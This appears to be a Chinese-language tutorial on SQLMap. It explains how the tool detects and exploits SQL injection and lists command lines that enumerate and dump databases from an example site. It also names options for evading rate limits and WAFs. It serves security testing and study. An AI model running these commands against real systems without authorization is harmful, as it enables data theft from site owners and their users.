## 一、概念

**SQLMap** 是一款开源的自动化 SQL 注入检测与利用工具，使用 Python 编写。它能够自动发现 Web 应用程序中的 SQL 注入漏洞，并利用这些漏洞**获取数据库的敏感信息**、**执行系统命令**等。支持几乎所有主流数据库（MySQL、Oracle、PostgreSQL、MSSQL、SQLite 等）和多种注入技术。

**主要用途**：
- 安全测试中对目标网站进行 SQL 注入漏洞检测    
- 渗透测试中获取==数据库内容==、==文件读写==、==权限提升==
- CTF 或靶场练习中的自动化工具

## 二、工作原理（本质）

SQLMap 的核心原理是**通过向目标参数注入精心构造的 SQL 语句，根据应用程序的响应差异来判断是否存在漏洞**。其工作流程可以分为几个阶段：

1. **探测阶段**：对目标 URL 的每个参数（**GET**/**POST**/**Cookie**/**Header**）发送大量测试 payload，观察响应变化。根据响应特征判断参数是否可注入，并识别注入类型（布尔盲注、时间盲注、报错注入、UNION 查询等）。
    
2. **指纹识别**：一旦确认存在注入，SQLMap 会尝试识别后端数据库类型及版本、当前用户权限、操作系统信息等。
    
3. **数据提取**：根据注入类型自动选择最有效的方式提取数据。例如：
    
    - **UNION 查询**：直接利用 UNION SELECT 回显数据，==速度最快==。
    - **报错注入**：通过触发数据库错误，从错误信息中获取数据。
    - **布尔盲注**：根据页面内容的真/假变化，逐字符猜解数据。
    - **时间盲注**：根据响应时间的延迟判断真/假，==速度最慢==。
    
4. **高级利用**：若权限足够，可进行文件读写、命令执行、注册表操作等。
    

SQLMap 本质上是一个高度自动化的**检测+利用框架**，其效率受网络延迟、注入类型、线程数等因素影响。

## 三、环境要求

- **Python 环境**：需要 Python 2.6/2.7 或 Python 3.x（推荐 3.6+）。
    
- **操作系统**：跨平台（Windows/Linux/macOS）。
    
- **Kali Linux**：系统内置，直接运行 `sqlmap` 命令即可。
    
- **手动安装**：
```bash
   
   git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
   cd sqlmap-dev
   python sqlmap.py -h
```
## 四、常用命令和选项

### 4.1 基本检测
```bash

# 检测 GET 参数
sqlmap -u "http://example.com/page.php?id=1"
# 检测 POST 参数
sqlmap -u "http://example.com/login.php" --data="username=admin&password=123"
# 自动应答（跳过交互）
sqlmap -u "http://example.com/page.php?id=1" --batch
```
### 4.2 核心控制参数

| 参数                  | 作用         | 说明                                        |
| ------------------- | ---------- | ----------------------------------------- |
| `--level=LEVEL`     | 测试深度 (1-5) | 默认1，提高等级会测试更多位置（Cookie、User-Agent等）       |
| `--risk=RISK`       | 风险等级 (1-3) | 默认1，提高风险可能使用更危险的 payload（如 OR 注入）         |
| `--technique=TECH`  | 指定注入技术     | 可选：B(布尔)、E(报错)、U(UNION)、S(堆叠)、T(时间)、Q(内联) |
| `--threads=THREADS` | 并发线程数      | 建议不超过10，可大幅提升盲注速度                         |

**示例**：

```bash

sqlmap -u "http://example.com/page.php?id=1" --level=3 --risk=2 --threads=5
```
### 4.3 数据提取

```bash

# 列出数据库
sqlmap -u "http://example.com/page.php?id=1" --dbs
# 列出当前数据库
sqlmap -u "http://example.com/page.php?id=1" --current-db
# 列出指定数据库的表
sqlmap -u "http://example.com/page.php?id=1" -D dbname --tables
# 列出表的字段
sqlmap -u "http://example.com/page.php?id=1" -D dbname -T tablename --columns
# 导出数据
sqlmap -u "http://example.com/page.php?id=1" -D dbname -T tablename --dump
# 导出指定字段
sqlmap -u "http://example.com/page.php?id=1" -D dbname -T tablename -C col1,col2 --dump
```

### 4.4 其他常用选项

- `--cookie="COOKIE"`：==设置 Cookie==
- `--random-agent`：==随机 User-Agent==
- `--proxy="http://127.0.0.1:8080"`：使用代理（配合 Burp Suite）
- `--delay=1`：每个请求间隔 1 秒（用于**绕过频率限制**）
- `--timeout=10`：超时时间（秒）
- `--no-cast`：关闭数据转换（可加速）
- `--flush-session`：清空会话缓存，重新测试
- `--tamper=脚本名`：使用 tamper 脚本绕过 WAF